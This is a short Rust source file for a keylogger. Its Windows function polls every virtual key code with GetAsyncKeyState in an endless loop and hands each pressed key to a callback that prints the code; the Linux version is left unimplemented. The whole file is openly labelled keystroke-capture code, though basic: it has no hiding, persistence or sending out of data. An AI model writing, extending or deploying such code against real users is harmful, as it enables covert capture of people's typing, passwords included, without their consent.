use std::sync::mpsc;
use std::sync::mpsc::{Receiver, Sender};
#[cfg(windows)]
use winapi::shared::windef::HHOOK;
#[cfg(windows)]
use winapi::shared::minwindef::{LPARAM, WPARAM, LRESULT, UINT};
#[cfg(windows)]
use winapi::um::winuser;
#[cfg(windows)]
use winapi::ctypes::c_int;


pub trait Keylogger{
    //! Allows for a Keylogger to have a custom callback
    fn onKeyDown(&self, key: i32);
}

pub struct WinKeylogger{}

impl Keylogger for WinKeylogger{
    fn onKeyDown(&self, key: i32){
        println!("{}", key);
    }
}


#[cfg(windows)]
pub fn run_keylogger(logger: &dyn Keylogger){
    //! Create a windows keylogger

    loop{
        for i in 0 as c_int..255 as c_int {
            let key = unsafe { winuser::GetAsyncKeyState(i) };

            if (key & 1) > 0 {
                let s = i as i32;

                logger.onKeyDown(s);
            }
        }
    }


}

#[cfg(linux)]
pub fn run_keylogger(logger: &Keylogger){
    //! Create a linux keylogger
    unimplemented!();
}